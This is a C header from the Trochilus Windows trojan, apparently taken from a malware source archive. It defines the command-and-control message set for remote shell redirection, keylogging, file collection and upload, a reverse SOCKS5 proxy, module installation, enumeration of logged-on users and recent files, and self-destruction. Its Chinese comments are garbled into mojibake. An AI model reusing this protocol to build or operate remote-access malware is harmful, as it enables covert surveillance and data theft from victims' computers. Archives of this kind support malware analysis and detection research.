/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once

#define MSGID UINT64
#define MSGSERIALID UINT64
#define INVALID_MSGSERIALID 0

#define INVALID_MSGID MAXUINT64

#define DOWNLOAD_SERVANT_CMD	TEXT("/logo.png")

#define MSGIDBASE 0LL

#define MSGID_PULL_COMMAND							(MSGIDBASE + 1LL)
//desc: ��ȡ��������

#define MSGID_NO_COMMAND							(MSGIDBASE + 2LL)
//desc: ����˱�ʾû�����µ�����

#define MSGID_REPLY_COMMAND							(MSGIDBASE + 3LL)
//desc: �ͻ���Ӧ�����������Ϣ��

#define MSGID_LIST_MOD								(MSGIDBASE + 4LL)
//desc: ��ȡ�Ѿ����ص�ģ��
//ret:
//	mods	str		ģ������

#define MSGID_SET_DEFAULT_COMMNAME					(MSGIDBASE + 5LL)
//desc: ����Ĭ�ϵ�ͨ�ŷ�ʽ
//param:
//	commname	str	(��ѡ)http,dns
//ret:
//	commname	str	��ǰ��Ĭ��ͨ�ŷ�ʽ

#define MSGID_DOWNLOAD_FILE							(MSGIDBASE + 6LL)
//desc: �ͻ��˴���Ϣ�л�ȡ�ļ�����
//param:
//	localfile	str	������ļ�
//	targetfile	str	�ͻ����ļ�

//#define MSGID_FILE_EXISTS							(MSGIDBASE + 7LL)
//desc: �ͻ����ж�ĳ���ļ���Ŀ¼�Ƿ����
//param:
//	filepath	str	�ļ�����·��
//ret:
//	exists		uint64	bool�Ƿ����
//	isdir		uint64	bool�Ƿ���Ŀ¼

#define MSGID_LIST_FILES							(MSGIDBASE + 8LL)
//desc: �ͻ�����ȡĳ���ļ�Ŀ¼
//param:
//	findstr		str	�����ַ���
//ret:
//	result		str	Ŀ¼����	filename(str)|attr(dword)|filesize(uint64)|lastWriteTime(uint64 filetime):

//#define MSGID_MOVE_FILE								(MSGIDBASE + 9LL)
//desc: �ͻ����ƶ��ļ�
//param:
//	src			str	ԭ�ļ�
//	dest		str	Ŀ���ļ� 
//ret:
//	result		uint64	bool�Ƿ�ɹ�

//#define MSGID_COPY_FILE								(MSGIDBASE + 10LL)
//desc: �ͻ��˸����ļ�
//param:
//	src			str	ԭ�ļ�
//	dest		str	Ŀ���ļ�
//ret:
//	result		uint64	bool�Ƿ�ɹ�

//#define MSGID_DELETE_FILE							(MSGIDBASE + 11LL)
//desc: �ͻ���ɾ���ļ�
//param:
//	dest		str	Ŀ���ļ�
//ret:
//	result		uint64	bool�Ƿ�ɹ�

#define MSGID_DISKS									(MSGIDBASE + 12LL)
//desc: ��ȡ�ͻ��˵Ĵ��̷���
//param:
//ret:
//	result		str	�������� partition(str)|drivertype(uint)|totalbytes(uint64)|freebytes(uint64):

//#define MSGID_EXECUTE_CMDLINE						(MSGIDBASE + 13LL)
//desc: ִ�пͻ��˵ĳ���
//param:
//	cmdline		str	������
//ret:
//	result		str	ִ�н��

#define MSGID_REQUEST_REPORT_INFO					(MSGIDBASE + 14LL)
//desc: �ͻ����ϱ�������Ϣ
//param:
//	cn			str	������
//	ip			str	�ö��ŷָ��ı���IP�б�
//	instime		uint64	������װʱ��
//	os			uint64	����ϵͳ�汾
//	x64			uint64	�Ƿ�x64ƽ̨
//	mods		str �ö��ŷָ��ı���ģ�������б�

//#define MSGID_REDIRECT_EXEC							(MSGIDBASE + 15LL)
//desc: �ڿͻ�����ִ�г��򣬲�������������ض���
//param:
//	cmd			str	������
//ret:
//	pid			uint64	����pid�������0�����ʾʧ��

//#define MSGID_REDIRECT_INPUT						(MSGIDBASE + 16LL)
//desc: ��ͻ��˵Ľ��̽�������
//param:
//	pid			uint64	����pid
//	in			str		��������
//ret:
//	active		uint64	�����Ƿ񻹴���
//	out			str		���̵����

//#define MSGID_REDIRECT_CLOSE						(MSGIDBASE + 17LL)
//desc: �����ͻ��˵��ض������
//param:
//	pid			uint64	����pid






#define MSGID_CMDREDIRECT_OPEN						(MSGIDBASE + 18LL)
//desc: ServerҪ��ͻ��˴�cmd����
//ret:
//	result		uint64	TRUE/FALSE

#define MSGID_CMDREDIRECT_INPUT						(MSGIDBASE + 19LL)
//desc: �������ͻ��˵�cmd��������
//param:
//	input		str		����
//	rn			uint64	�Ƿ��ں��油��\r\n
//ret:
//	result		uint64	TRUE/FALSE

#define MSGID_CMDREDIRECT_OUTPUT					(MSGIDBASE + 20LL)
//desc: �ͻ�����server����cmd�����
//param:
//	bytedata ���

#define MSGID_CMDREDIRECT_CLOSE						(MSGIDBASE + 21LL)
//desc: �����ͻ��˵�cmd�ض������
//param:
//	result		uint64	TRUE/FALSE

#define MSGID_UPLOAD_FILE							(MSGIDBASE + 22LL)
//desc: �ͻ��˽�ָ�����ļ�������Ϣ�н����ϴ�
//param:
//	remotefile	str	�ͻ��˵��ļ�


#define MSGID_AVAILABLE_COMM						(MSGIDBASE + 23LL)
//desc: �ͻ���ͨ������Ϣ��̽���ŵ��Ƿ���ã��ͻ��˷��ͣ���������Ӧ
//param:
//	commname	uint64
//ret:
//	commname	uint64

#define MSGID_SET_FILESERVER_LIST					(MSGIDBASE + 24LL)
//desc: ���ÿͻ��˵��ļ��������б�
//param:
//	url			str		http://192.168.0.250/file.php,http://192.168.0.251/file.php

#define MSGID_COLLECT_FILE							(MSGIDBASE + 25LL)
//desc: �����Ҫ��ͻ��˽����ļ��ռ�
//param:
//	filepath		str		c:\windows\calc.exe
//	blockcount		uint64	ÿһ��Ĵ�С,64k�ı���ֵ
//	intervaltime	uint64	���ݿ鷢�ͼ��ʱ��(����)
//ret:
//	fileid		str		�ļ�id

//#define MSGID_COLLECT_FILE_BODY						(MSGIDBASE + 26LL)
//desc: �����Ҫ��ͻ����ռ������ļ�
//param:
//	fileid		str		
//	filepath	str
//	offset		uint64
//	size		uint64

#define MSGID_QUERY_COLLECTING_FILE					(MSGIDBASE + 27LL)
//desc: ����˲�ѯ�ͻ������ڽ��е��ļ���������
//param:
//ret:
//	filepathlist	str		c:\windows\calc.exe,c:\windows\	

#define MSGID_ABORT_COLLECT_FILE					(MSGIDBASE + 28LL)
//desc: ȡ�����ڽ��е��ļ�����
//param:
//	fileid		str	

#define MSGID_INSTALL_MODULE						(MSGIDBASE + 29LL)
//desc: �������ͻ��˲�����ģ��
//param:
//	modname		str			ģ���ļ�����



#define MSGID_QUERY_START_SOCKS5				(MSGIDBASE + 30LL)
//desc: ��Զ�̿ͻ���socks5����
//param:
//reverseip str
//password str
//username str
//port uint64

#define MSGID_QUERY_STOP_SOCKS5				(MSGIDBASE + 31LL)
//desc: �ر�Զ�̿ͻ���socks5����
//param:

#define MSGID_SELF_DESTRUCTION					(MSGIDBASE + 32LL)
//desc: �������ͻ��˷���ָ��,�����Ի�
//param:

#define MSGID_QUERY_START_KEYLOGGER			(MSGIDBASE + 33LL)
//desc: ��Զ�̿ͻ��˼��̼�¼
//param:
//logpath str		����·��
//maxsize uint64	������ļ�����С,��λ�ֽ�

#define MSGID_QUERY_STOP_KEYLOGGER			(MSGIDBASE + 34LL)
//desc: �ر�Զ�̿ͻ��˼��̼�¼
//param:

#define MSGID_MAKE_CLIENT_UPLOAD_PROGRESS	(MSGIDBASE + 35LL)
//desc: �ͻ���֪ͨ������ļ�, �ļ�����Ľ���
//param:
//	msgserial uint64	��Ϣ���к�
//	cpserial uint64		CPЭ��Ĵ������к�
//	totalsize uint64	�ļ��ܴ�С

#define MSGID_QUERY_LOGON_USERS				(MSGIDBASE + 36LL)
//desc: ����˲�ѯ�ͻ��˵�ǰ��¼�û���
//param:
//ret:
//	result	str		true/false
//	users	str		���ŷָ����û��Ự��Ϣ username|sessionid|state|stationname,

#define MSGID_QUERY_MRU_FILE				(MSGIDBASE + 37LL)
//desc: ����˲�ѯ�ͻ�����������ļ���Ϣ
//param:
//	aftertime	uint64	��ȡ�����ʱ��֮�������
//	checkexists	uint64	�Ƿ����ļ��Ƿ����
//ret:
//	result	str		����:"�ļ�·��?�ļ�״̬(0-δ֪,1-����,2-������)?����޸�ʱ��",����: c:\a.txt?0?1231211|d:\b.doc?1?1232122
#define MSGID_UNINSTALL_MODULE						(MSGIDBASE + 38LL)
//desc: �������ͻ��˲�����ģ��
//param:
//	modname		str			ģ���ļ�����
#define MSGID_DELETE_SERIALID						(MSGIDBASE + 39LL)

#define MSGID_GET_FILE						(MSGIDBASE + 40LL)

#define MSGID_PUT_FILE						(MSGIDBASE + 41LL)

#define MSGID_REQUESTPUT_FILE				(MSGIDBASE + 42LL)

#define MSGID_DELETE_FILE						(MSGIDBASE + 43LL)

#define MSGID_RUN_FILE				(MSGIDBASE + 44LL)

#define MSGID_OUTPUT_ERROR						(MSGIDBASE + 44LL)

#define MSGID_HTTPDOWN_FILE						(MSGIDBASE + 45LL)